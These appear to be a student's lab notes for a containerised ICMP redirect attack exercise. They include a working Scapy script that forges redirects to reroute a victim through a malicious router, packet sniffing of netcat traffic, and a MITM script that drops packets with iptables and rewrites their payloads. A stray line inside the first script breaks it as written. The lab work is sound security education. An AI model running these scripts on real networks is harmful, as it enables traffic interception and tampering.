# Task 1
## 1.  Starting the Containers
```
sudo docker compose up
```
- ![[Pasted image 20250509123930.png]]
- ![[Pasted image 20250509124032.png]]
- we will use the attacker machine to test 
```
docker exec -it csl-attacker bash
```
## 2. Testing Local Subnet Connectivity (`10.9.0.0/24`)
```
ping -c 3 10.9.0.5     # Victim
ping -c 3 10.9.0.11    # Legitimate Router
ping -c 3 10.9.0.111   # Malicious Router
```
![[Pasted image 20250513225756.png]]

## 3. Cross-subnet via the router (`192.168.60.0/24`)
```
ping -c 3 192.168.60.5  # Server 1
ping -c 3 192.168.60.6  # Server 2
```

![[Pasted image 20250513225830.png]]


# Task 2
implemented a Python script called `icmp_spoofer.py` using the Scapy library. This script constructs ICMP Redirect packets with the following structure:
    - **IP.src** = legitimate router IP (`10.9.0.11`)
    - **IP.dst** = victim IP (`10.9.0.5`)
    - **ICMP.type = 5**, **code = 1** (Host redirect)
    - **ICMP.gateway** = malicious router IP (`10.9.0.111`)
    - Embedded **original IP header** that caused the redirect (from victim to server)
    

The script continuously sends these packets
## Routing table vs routing cache
![[Pasted image 20250515151328.png]]
## Walkthrough
- **Victim (10.9.0.5)** wants to ping or talk to **192.168.60.5**.
- Normally, the victim sends the packet via the **old gateway (10.9.0.11)**.
- **script** forges a packet pretending to be from `10.9.0.11`, saying:
    > "Use 10.9.0.111 (attacker) as the next hop for 192.168.60.5."
- Victim updates its *Routing Cache** , and starts forwarding those packets to **you** instead.
## Mental image
- I will send icmp packet inside an ip packet 
- ![[Pasted image 20250515151038.png]]
## Script
```
from scapy.all import *
import time

victim_ip = "10.9.0.5"
old_gateway = "10.9.0.11"
malicious_gateway = "10.9.0.111"
target_ip = "192.168.60.5"

inner_ip = IP(src=victim_ip, dst=target_ip)
inner_icmp = ICMP()
outer_ip = IP(src=old_gateway, dst=victim_ip)
icmp_redirect = ICMP(type=5, code=1, gw=malicious_gateway)
packet = outer_ip / icmp_redirect / inner_ip / inner_icmp
try 64 random bits 
print(f"[+] Continuous ICMP Redirect to {victim_ip}: use {malicious_gateway} for {target_ip}")
try:
    while True:
        send(packet, verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopped sending redirects.")
```
- Run this script inside the **malicious-router** container:  
```
python3 /volumes/icmp_spoofer.py
```
## Observations
- When we ran the script and checked the output of `ip route` on the victim, **no change** in routing appeared.
     - This is expected. **ICMP Redirects do not update the main routing table** (visible via `ip route`). Instead, they update the **internal routing cache**, which modern Linux kernels no longer expose directly.
     - So to verify the redirect, we used:
     - `mtr -n 192.168.60.5`: to monitor live path to destination
     - `tcpdump -n -i eth0 icmp`: to check that victim receives the spoofed ICMP packet
     - ![[Pasted image 20250513232956.png]]
- ### Routing Table vs. Routing Cache
    -  `ip route` shows persistent routes (configured manually or via DHCP).
    - **Routing cache** is temporary and dynamic, used to speed up forwarding.
    - **ICMP Redirect only updates the cache**, not the table.
    - That’s why the redirect isn’t visible via `ip route`, but affects forwarding (visible via `mtr` or `tcpdump`).
## Scenarios
### Scenario 1: Attacker, malicious router, and victim are in the same sub-network
- **Setup**:
    - Victim IP: `10.9.0.5`
    - Malicious Router IP: `10.9.0.111`
    - Legitimate Router IP: `10.9.0.11`
- Action
     - The attacker (from `10.9.0.105`, for example) sends an ICMP Redirect to the victim, pretending to be `10.9.0.11`, and suggests using `10.9.0.111` as the gateway.
 - How :
     - Victim sees the malicious router directly.
     - Attacker pretends the suggestion is coming from the legit gateway.
     - Everything looks normal to the victim — it accepts the redirect.
### Scenario 2: Attacker and victim are in the same subnet, but the redirect points to a router on a different subnet
- **❌ Doesn't work.**
    - The victim gets a message that says, “Use this router instead.”
    - But the IP address of that new router is NOT in the same local network.
    - The victim says: “Wait… I can’t even _see_ that router. How would I send it anything directly?”
    - It ignores the suggestion.
### Scenario 3 : The attacker and the victim are in the same network. However, the attacker tries to redirect the victim’s communication to a non-existing router.
- **❌ Doesn't work.**
     - But there’s no real router at that IP.
     - Result: Traffic is lost — like mailing a letter to a fake address.
### Scenario 4: Attacker in a different subnet
- **❌ Doesn’t work.**
     - The attacker isn’t in the victim’s network at all.
     - He can’t even fake being the gateway.
     - The victim receives a redirect from someone it doesn’t even trust — and ignores it.
# Task 3
- On the **malicious router**, `tcpdump` was used to observe TCP traffic passing through
```
tcpdump -i eth0 -n -A tcp port 9090
```
- A **netcat server** was started on the server machine (`192.168.60.5`) listening on port 9090:
```
nc -lvnp 9090
```
![[Pasted image 20250514014355.png]]
- A **netcat client** was initiated on the victim machine to connect to the server:
```
nc 192.168.60.5 9090
```
![[Pasted image 20250514014306.png]]

- we as an attacker can see the content now 
![[Pasted image 20250514014420.png]]
# Task 4
- after being MITM from task 3
- Using this script 
```
#!/usr/bin/env python3

import argparse
import subprocess
from scapy.all import sniff, IP, TCP, Raw, send

# --- Command-line Arguments ---
def get_args():
    parser = argparse.ArgumentParser(description="TCP Payload Interceptor & Modifier")
    parser.add_argument("-s", "--src", required=True, help="Victim IP address to monitor")
    parser.add_argument("-f", "--find", required=True, help="Text to find in TCP payload")
    parser.add_argument("-r", "--replace", required=True, help="Text to replace it with")
    return parser.parse_args()

args = get_args()

victim_ip = args.src
pattern = args.find.encode()
replacement = args.replace.encode()

# --- Enforce equal length by padding if needed ---
if len(replacement) > len(pattern):
    print("[!] Replacement string must not be longer than the original.")
    exit(1)
elif len(replacement) < len(pattern):
    replacement = replacement.ljust(len(pattern), b' ')

# --- Drop original packets using iptables rule ---
drop_cmd = [
    "iptables", "-A", "FORWARD",
    "-s", victim_ip,
    "-p", "tcp", "--dport", "9090",
    "-m", "string", "--string", args.find,
    "--algo", "kmp", "-j", "DROP"
]

try:
    subprocess.run(drop_cmd, check=True)
    print(f"[+] iptables rule added to block packets containing: {args.find}")
except subprocess.CalledProcessError as e:
    print(f"[!] Failed to set iptables rule: {e}")
    exit(1)

# --- Packet Handling Logic ---
def handle_packet(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].src == victim_ip:
        raw_payload = pkt[TCP].payload.load if pkt[TCP].payload else b''
        if pattern in raw_payload:
            print(f"[+] Match found. Original: {raw_payload.decode(errors='ignore')}")
            altered_payload = raw_payload.replace(pattern, replacement)

            # Craft new packet
            modified = IP(bytes(pkt[IP]))
            del modified[TCP].chksum
            del modified[IP].len
            del modified[IP].chksum
            modified[TCP].remove_payload()

            # Send modified packet
            send(modified / Raw(altered_payload))
            print(f"[+] Sent modified packet: {altered_payload.decode(errors='ignore')}")
        else:
            pass  # No match in payload

# --- Start Sniffing ---
print("[*] MITM Payload Modifier is active...")
sniff(iface="eth0", filter="tcp", prn=handle_packet)

```
- we try to modify messages
- run the script on the malicous router
```
python3 /volumes/MITM.py -s 10.9.0.5 -f "failed" -r "passed"
```
